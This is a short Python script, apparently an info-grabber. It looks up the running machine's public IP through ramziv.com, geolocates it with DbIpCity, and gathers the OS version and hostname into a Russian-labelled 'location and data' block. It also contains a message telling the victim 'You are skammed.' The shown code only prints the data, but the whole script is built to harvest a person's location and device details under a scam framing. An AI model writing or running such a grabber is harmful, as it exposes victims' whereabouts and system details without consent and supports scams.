# MODULES
from ip2geotools.databases.noncommercial import DbIpCity
import socket
import platform
import requests


ip = requests.get("https://ramziv.com/ip").text
response = DbIpCity.get(ip,api_key='free')
ip = response.ip_address
city = response.city
region = response.region
latitude = response.latitude
longitude = response.longitude
system = platform.system() + " " + platform.release()
system_name = socket.gethostname()
geodata = "###############\nМестоположение и данные\nОперационная система: " + system + "\nИмя пользователя: " + system_name + "\nIP-адрес: " + ip + "\nГород: " + city + "\nОбласть: " + region + "\nШирота: " + str(latitude) + "\nДолгота: " + str(longitude) + "\n###############"



def on_ready():
    print("You are skammed. You can close this window")


print(geodata)

